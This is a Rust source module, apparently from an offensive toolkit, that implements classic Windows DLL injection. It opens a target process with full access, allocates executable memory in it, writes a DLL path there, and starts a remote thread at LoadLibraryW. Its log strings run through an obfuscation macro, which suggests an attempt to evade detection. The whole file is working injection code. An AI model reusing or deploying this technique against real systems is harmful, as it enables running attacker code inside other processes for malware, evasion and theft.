use anyhow::{Result, Context, bail};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::processthreadsapi::{CreateRemoteThreadEx, OpenProcess};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::memoryapi::{WriteProcessMemory, VirtualAllocEx};
use winapi::um::winnt::{HANDLE, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
use winapi::um::libloaderapi::{GetProcAddress, GetModuleHandleW};

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use crate::obfuscate;

pub async fn injector(pid: &str, dll_path: &str) -> Result<()> {
	let pid: u32 = pid.parse()?;
    let mut log = String::new();
    let dll_name: Vec<u16> = OsStr::new(dll_path).encode_wide().chain(Some(0)).collect();

    let dll_name_size = dll_name.len() * std::mem::size_of::<u16>();
    let hProcess = unsafe {
    	OpenProcess(PROCESS_ALL_ACCESS, 0, pid)
    };

    if hProcess == INVALID_HANDLE_VALUE {
        log += &obfuscate!("\n[?] OpenProcess failed : ");
        log += &format!("0x{:08X}",  unsafe {GetLastError()});
        bail!("{log}");    	
    }
    
    
    let mem_alloc = unsafe {
        VirtualAllocEx(hProcess, 
                       ptr::null_mut(),
                       dll_name_size, 
                       MEM_COMMIT | MEM_RESERVE,
                       PAGE_EXECUTE_READWRITE
                       )};
    
    if mem_alloc.is_null() {
        log += &obfuscate!("\n[?] VirtualAllocEx failed : ");
        log += &format!("0x{:08X}",  unsafe {GetLastError()});
        bail!("{log}");

    }
    log += &obfuscate!("\n[*] VirtualAllocEx succeeded:  ");
    log += &format!("{} bytes -> {:p}", dll_name.len() + 1, &mem_alloc);

    let mut bytes_written = 0;
    let result = unsafe {
        WriteProcessMemory(hProcess,
                           mem_alloc,
                           dll_name.as_ptr() as *const _,
                           dll_name_size,
                           &mut bytes_written
                        )};

    if result == 0 {
        log += &obfuscate!("\n[?] WriteProcessMemory failed : ");
        log += &format!("0x{:08X}", unsafe {GetLastError()});
        bail!("{log}");
    }

    log += &obfuscate!("\n[+] WriteProcessMemory succeeded: ");
    log += &format!("{} bytes -> : {:p}", bytes_written, &mem_alloc);

    let kernel_dll: Vec<u16> = OsStr::new("kernel32.dll").encode_wide().chain(Some(0)).collect();
    
    let kernel32 = unsafe {GetModuleHandleW(kernel_dll.as_ptr())};
    let load_lib_w = unsafe {GetProcAddress(kernel32, "LoadLibraryW\0".as_ptr() as *const i8)};

    if load_lib_w.is_null(){
        let e = unsafe {GetLastError()};
        log += &obfuscate!("\n[?] Failed to get the address of LoadLibraryW : ");
        log += &format!("0x{:08X}", e);
        bail!("{log}");
    }
    
    log += &obfuscate!("\n[*] LoadLibraryW addr: ");
    log += &format!("{:p}", load_lib_w);
    log += &obfuscate!("\n[+] Creating a thread in the remote process ...");

    let hThread = unsafe {
        CreateRemoteThreadEx(hProcess,
                             ptr::null_mut(),
                             0,
                             Some(std::mem::transmute(load_lib_w)),
                             mem_alloc,
                             0,
                             ptr::null_mut(),
                             ptr::null_mut(),
                            )};

    if hThread.is_null(){
        log += &obfuscate!("\n[?] CreateRemoteThreadEx failed : ");
        log += &format!("0x{:08X}", unsafe {GetLastError()});
        bail!("{log}");
    }
    
    Ok(())
}